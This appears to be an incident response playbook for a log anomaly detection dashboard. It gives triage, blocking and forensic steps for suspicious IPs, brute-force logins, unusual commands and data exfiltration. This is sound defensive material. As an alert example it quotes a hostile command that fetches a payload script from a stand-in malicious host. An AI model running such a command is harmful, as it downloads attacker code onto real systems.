Incident Response Playbook

Step-by-step actions when anomalies are detected

Scenario 1: Anomalous External IP Address
Alert Example: Multiple failed SSH login attempts from 192.0.2.100 (Score: 0.87)
Immediate Actions (0-5 minutes)
  1. Verify the IP:
    • Go to Dashboard → Log Details
    • Filter by Host/IP: 192.0.2.100
    • Check how many attempts and what services targeted
  2. Check if IP is known:
    • Is it from your organization's IP range?
    • Run: whois 192.0.2.100 to identify owner
    • Check if VPN, cloud service, or legitimate partner
  3. Block immediately if malicious:
    • sudo iptables -A INPUT -s 192.0.2.100 -j DROP
    • sudo iptables-save
Investigation (5-30 minutes)
  1. Review all activity:
    • Check Analytics page for patterns
    • Look for successful logins from this IP
    • Check other services (HTTP, database) from same IP
  2. Assess damage:
    • Were any accounts compromised?
    • Was any data accessed or modified?
    • Check for lateral movement to other systems
  3. Document findings:
    • Screenshot anomaly logs
    • Note: Date, Time, IP, Services affected
    • Export logs: Dashboard → Log Details → Filter → Export
Remediation (30+ minutes)
  1. Reset compromised accounts (if any)
  2. Update firewall rules to block IP range if needed
  3. Review and update security policies
  4. Notify relevant stakeholders
  5. Add to threat intelligence database
Scenario 2: Brute Force Login Attempt
Alert Example: 50+ failed SSH login attempts for user 'admin' in 2 minutes (Score: 0.92)
Quick Actions
  1. Block source IP immediately (see Scenario 1)
  2. Check if account locked: passwd -S username
  3. Force password reset for targeted account
  4. Enable fail2ban if not already active:
    • sudo systemctl enable fail2ban
    • sudo systemctl start fail2ban
Scenario 3: Unusual Command Patterns
Alert Example: Suspicious commands: wget malicious.com/payload.sh (Score: 0.95)
Critical Actions
  1. Isolate affected system from network immediately
  2. Check for running malicious processes:
    • ps aux | grep suspicious
    • netstat -tulpn | grep ESTABLISHED
  3. Check /tmp and user directories for downloaded files
  4. Review command history: history for compromised user
  5. If malware found: Contact security team, preserve evidence, reimage system
Scenario 4: Potential Data Exfiltration
Alert Example: Large outbound transfer to external IP (Score: 0.89)
Emergency Response
  1. Block outbound connection to suspicious IP
  2. Identify what data was accessed:
    • Check file access logs
    • Review database query logs
    • Check web server access logs
  3. Contact legal/compliance team if sensitive data
  4. Preserve all logs for forensic analysis
  5. Report to authorities if required by regulations

Understanding Anomaly Scores

Each log gets a score from 0.0 (normal) to 1.0 (anomaly) based on AI analysis.

Score Badge Color Meaning Action
0.0 - 0.5 NORMAL Regular system activity No action required
0.5 - 0.7 SUSPICIOUS Unusual but may be benign Review if time permits
0.7 - 0.85 HIGH Likely security incident Investigate immediately
0.85 - 1.0 CRITICAL Active attack detected URGENT: Block & respond
What the AI Looks For
  • Unusual IP addresses
  • Strange command patterns
  • Off-hours activity
  • High error rates
  • Failed authentication spikes
  • Access to restricted resources
  • Malicious payloads
  • Large data transfers
Note: Model achieves 88.5% accuracy on Apache logs and 85.7% on Linux logs. False positives may occur but are rare.
